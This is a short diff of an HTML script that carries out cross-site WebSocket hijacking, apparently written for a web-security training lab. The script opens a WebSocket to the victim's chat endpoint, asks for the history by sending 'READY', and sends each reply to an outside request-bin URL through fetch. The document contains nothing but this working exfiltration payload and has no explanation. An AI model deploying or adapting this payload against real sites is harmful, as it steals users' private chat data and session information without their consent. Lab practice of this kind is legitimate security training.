@@ -1,11 +1,11 @@
 <script>
-websocket = new WebSocket('wss://chatws-44.stream.highwebmedia.com/ws/933/cjniz11k/websocket/')
+websocket = new WebSocket('wss://acc01fea1f6edb6281652b9b001400b0.web-security-academy.net/chat')
 websocket.onopen = start
 websocket.onmessage = handleReply
 function start(event) {
   websocket.send("READY");
 }
 function handleReply(event) {
-  fetch('https://postb.in/b/1594719205578-4659795262850/?'+event.data, {mode: 'no-cors'})
+  fetch('https://postb.in/b/1595067035737-8240851999726/?'+event.data, {mode: 'no-cors'})
 }
 </script> 
